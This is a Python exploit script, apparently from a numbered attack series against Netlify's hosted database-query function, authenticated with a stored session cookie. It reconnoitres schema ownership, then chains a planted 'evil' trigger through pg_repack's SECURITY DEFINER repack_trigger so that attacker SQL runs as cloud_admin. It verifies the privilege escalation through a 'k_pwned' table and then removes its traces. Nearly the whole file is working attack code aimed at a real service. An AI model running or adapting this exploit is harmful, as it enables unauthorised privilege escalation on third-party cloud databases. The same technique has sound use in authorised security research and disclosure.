# -*- coding: utf-8 -*-
"""波21:多函数组合链 —— repack_trigger(prosecdef=cloud_admin) + 预建 repack.log_<oid> 表
     + log 表上第二层触发器 -> 在 cloud_admin 上下文中执行我们的函数
A1 侦查 repack/public schema owner + ACL
A2 建源表 k_src,拿真实 oid
A3 预建 repack.log_<oid>(若 schema 可写)
A4 建 evil 函数 -> log 表挂触发器 -> INSERT k_src 触发链
A5 验证 k_pwned 的 owner(cloud_admin = 提权成立)
A6 清理
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:8000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# A1: schema owner/ACL 侦查
s, b, dt = tx(["select n.nspname, n.nspowner::regrole::text as owner, "
               "coalesce(n.nspacl::text,'NULL') as acl from pg_namespace n "
               "where n.nspname in ('repack','public')"])
print('A1_schema_owner  [%d] %.1fs' % (s, dt))
print('   ' + b[:2500])
print()

# A2: 建源表 + 拿 oid
s, b, dt = tx(["drop table if exists k_src",
               "create table k_src(id int, v text)",
               "select 'OID='||oid::text||' NAME='||relname from pg_class where relname='k_src'"])
print('A2_src_oid       [%d] %.1fs' % (s, dt))
print('   ' + b[:1500])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('   -> src oid =', oid)
print()

if not oid:
    sys.exit('A2 未解析到 oid,终止')

# A3: 预建 repack.log_<oid>
s, b, dt = tx(["create table repack.log_%s (id int, v text)" % oid])
print('A3_mklog         [%d] %.1fs' % (s, dt))
print('   ' + b[:800])
if s != 200 or 'error' in b.lower()[:400] and 'success' not in b.lower():
    print('   !! repack schema 不可写,链死')
print()

# A4: evil 函数 + log 表触发器 + 触发链
evil = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
        "begin "
        "  execute 'drop table if exists public.k_pwned'; "
        "  execute 'create table public.k_pwned as select current_user::text as u, session_user::text as su'; "
        "  return new; "
        "end $q$")
s, b, dt = tx([evil,
               "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('x')",
               "insert into k_src values (1, 'hello')"])
print('A4_trigger_chain [%d] %.1fs' % (s, dt))
print('   ' + b[:2500])
print()

# A5: 验证 k_pwned owner
s, b, dt = tx(["select tableowner from pg_tables where tablename='k_pwned'",
               "select * from k_pwned"])
print('A5_verify        [%d] %.1fs' % (s, dt))
print('   ' + b[:2000])
print()

# A6: 清理
s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop function if exists public.k_evil()",
               "drop table if exists public.k_pwned",
               "drop table if exists k_src",
               "drop table if exists repack.log_%s" % oid])
print('A6_cleanup       [%d] %.1fs' % (s, dt))
print('   ' + b[:500])
